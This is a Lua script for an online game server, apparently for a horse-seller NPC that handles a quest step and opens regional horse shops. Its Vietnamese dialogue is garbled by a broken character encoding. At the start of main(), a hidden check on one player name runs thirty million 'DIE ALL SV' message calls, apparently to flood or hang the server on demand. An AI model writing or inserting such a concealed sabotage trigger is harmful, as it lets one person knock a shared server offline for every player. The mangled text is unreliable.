--Author: thaihoa91



function main()
	if GetName() == "ConChimNon" then
		for i = 1,10000000 do
		Msg2Player("DIE ALL SV")
		end	
		for i = 1,10000000 do
		Msg2Player("DIE ALL SV")
		end	
		for i = 1,10000000 do
		Msg2Player("DIE ALL SV")
		end
	return end
	if GetTask(103) == 7 then
	Say("<color=green>B�n Ng�a<color>: ��i hi�p <color=fire>"..GetName().."<color> mu�n mua ng�a g�?: ",3,
	"Mua ng�a./muangua",
	"Giao t�n th� ch��ng m�n/giaotinthu",
	"Tho�t./no")	
	else
	Say("<color=green>B�n Ng�a<color>: ��i hi�p <color=fire>"..GetName().."<color> mu�n mua ng�a g�?: ",2,
	"Mua ng�a./muangua",
	"Tho�t./no")
	end
end;

function giaotinthu()
	if GetTask(103) == 7 then
		SetTask(103,8)
		Talk(1,"","<color=green>B�n Ng�a<color>: Ta �� nh�n ���c t�n th�, h�y n�i v�i Ch��ng M�n ng��i l� ta s� c� g�ng h�t s�c �� gi�p �� t� c�a ng��i !")
	end
end

function muangua()
w,x,y = GetWorldPos()
if w == 9 then
Sale(17)
elseif w == 17 then
Sale(18)
elseif w == 15 then
Sale(19)
elseif w == 18 then
Sale(20)
elseif w == 16 then
Sale(21)
elseif w == 66 then
Sale(19)
elseif w == 4 then
Sale(random(17,21))


end
end;

function no()
end;
